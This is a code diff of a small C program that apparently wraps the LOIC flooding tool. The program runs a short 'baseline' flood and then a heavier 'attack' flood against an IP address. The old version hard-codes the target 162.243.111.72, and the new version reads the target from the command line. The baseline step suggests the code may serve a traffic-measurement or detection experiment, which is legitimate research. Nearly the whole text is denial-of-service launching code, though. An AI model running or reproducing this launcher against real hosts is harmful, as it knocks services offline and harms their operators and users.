@@ -1,28 +1,43 @@
-#include <stdio.h>
-#include <stdlib.h>
 #include "attack_process.h"
+#include "io.h"
 
-int main(int argc, const char *argv[]){
-    char* cwd = malloc(SIZE_PATH * sizeof(char));
-    cwd = get_loic_path(cwd);
-
-    char** arg_list = malloc(5 * sizeof(char*));
-    int time_to_live;
-
-    arg_list[PROGRAM_PATH] = cwd;
-    arg_list[IP] = "162.243.111.72";
+void set_base_valor(char** arg_list, char* loic_path, char* ip){
+    arg_list[PROGRAM_PATH] = loic_path;
+    arg_list[IP] = ip;
     arg_list[RATE_FLAG] = "-r";
     arg_list[RATE_NUMBER] = "100";
     arg_list[FINAL_ARG] = NULL;
-    time_to_live = 5;
+}
 
-    printf("Setting baseline...\n");
-    call_attack(cwd, arg_list, time_to_live);
+void set_baseline(
+        char** arg_list,
+        const char* loic_path,
+        const unsigned int time_to_live
+        ){
 
+    print_set_baseline();
+    call_attack(loic_path, arg_list, time_to_live);
+}
+
+void attack(char** arg_list,
+        const char* loic_path,
+        const unsigned int time_to_live
+        ){
+
+    print_attack();
     arg_list[RATE_NUMBER] = "300";
-    time_to_live = 10;
-    printf("Attacking...\n");
-    call_attack(cwd, arg_list, time_to_live);
+    call_attack(loic_path, arg_list, time_to_live);
+}
+
+int main(int argc, char *argv[]){
+    char* loic_path = get_loic_path();
+    char** arg_list = alloc_arg_list();
+    char* ip = get_ip(argc, argv);
+
+    set_base_valor(arg_list, loic_path, ip);
+
+    set_baseline(arg_list, loic_path, 5);
+    attack(arg_list, loic_path, 10);
 
     return 0;
 }
